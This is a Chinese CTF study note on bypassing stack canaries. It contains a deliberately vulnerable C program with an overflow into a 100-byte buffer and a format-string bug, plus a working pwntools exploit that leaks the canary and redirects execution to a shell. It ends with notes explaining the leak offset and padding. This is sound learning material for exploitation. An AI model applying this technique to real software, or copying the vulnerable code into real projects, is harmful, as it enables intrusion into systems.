# ctfwiki---canary相关

做一些笔记，记自己想了一些的地方  

关键点：  
Canary 设计为以字节 \x00 结尾  

存在漏洞的源代码：  
```c
// ex2.c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
void getshell(void) {
    system("/bin/sh");
}
void init() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}
void vuln() {
    char buf[100];
    for(int i=0;i<2;i++){
        read(0, buf, 0x200);
        printf(buf);
    }
}
int main(void) {
    init();
    puts("Hello Hacker!");
    vuln();
    return 0;
}
```

编译命令：  
```sh
gcc -m32 -no-pie -fstack-protector-all ex2.c -o ex2
```
关闭 pie 保护，打开 canary 保护  

exp 脚本：  
```python
#!/usr/bin/env python

from pwn import *

context.binary = 'ex2'
#context.log_level = 'debug'
io = process('./ex2')

get_shell = ELF("./ex2").sym["getshell"]

io.recvuntil("Hello Hacker!\n")

# leak Canary
payload = "A"*100
io.sendline(payload)

io.recvuntil("A"*100)
Canary = u32(io.recv(4))-0xa
log.info("Canary:"+hex(Canary))

# Bypass Canary
payload = "\x90"*100+p32(Canary)+"\x90"*12+p32(get_shell)
io.send(payload)

io.recv()

io.interactive()
```

需要解释的地方：  
1. `Canary = u32(io.recv(4))-0xa` 为什么要减 0xa？  
因为 canary 以 \x00 结尾，一开始输入了 100 个 "A"和一个回车（0xa），回车恰好覆盖了 canary 的 \x00 字节，所以需要减去 0xa  

2. `payload = "\x90"*100+p32(Canary)+"\x90"*12+p32(get_shell)` 为什么 payload 长这样？  
前 100 个字节是 buf 的长度，canary 就是为了不破坏原来的 canary，  
后面填充的 12 个字节，这里可以从静态和动态两方面分别解释  
静态：  
从 IDA 看到 `buf= byte ptr -70h`，也就是 buf 离 ebp 0x70，进入 vuln 函数对栈做了 2 个操作：push ret_addr, push ebp，所以 buf 起始点到要覆盖地址的距离是 0x70+4=116 ，buf 的长度加 canary 的长度是 104，所以后面还需要再填充 12 个字节  
动态：  
    ```
    0xffffd2ac --> 0x8048714 (<main+68>:	mov    eax,0x0)  # return addr
    
    0xffffd238 --> 0x1                                     # buf addr
    ```
    buf 的起始地址 和 要覆盖地址的距离 0xac-0x38 = 116，然后就不用解释了  


2020/6/28  
